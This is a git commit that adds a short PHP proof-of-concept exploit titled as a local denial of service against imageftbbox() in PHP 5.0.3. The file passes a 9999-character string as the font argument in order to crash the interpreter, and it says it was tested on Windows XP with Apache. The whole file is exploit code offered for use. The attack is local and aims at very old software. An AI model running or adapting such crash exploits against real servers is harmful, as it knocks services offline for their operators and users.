296fcd489eb1043b7c6a43a2792227063a6b9997
Yakir Wizman <yakir.wizman@gmail.com>
2016-08-07 20:00:50 +0300

    Create PHP 5.0.3 imageftbbox() Local Denial of Service.php

---
+++ PHP 5.0.3 imageftbbox() Local Denial of Service.php
@@ -0,0 +1,15 @@
+<?php
+// ==================================================================================
+//
+// PHP 5.0.3 imageftbbox() Local Denial of Service
+//
+// Tested on WIN XP, Apache, PHP 5.0.3. Local Denial of Service.
+//
+// Local Denial of Service
+// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com>>
+// http://www.nullbyte.org.il
+//
+// ==================================================================================
+$buff = str_repeat("A", 9999);
+imageftbbox(1, 1, $buff, 1);
+?>
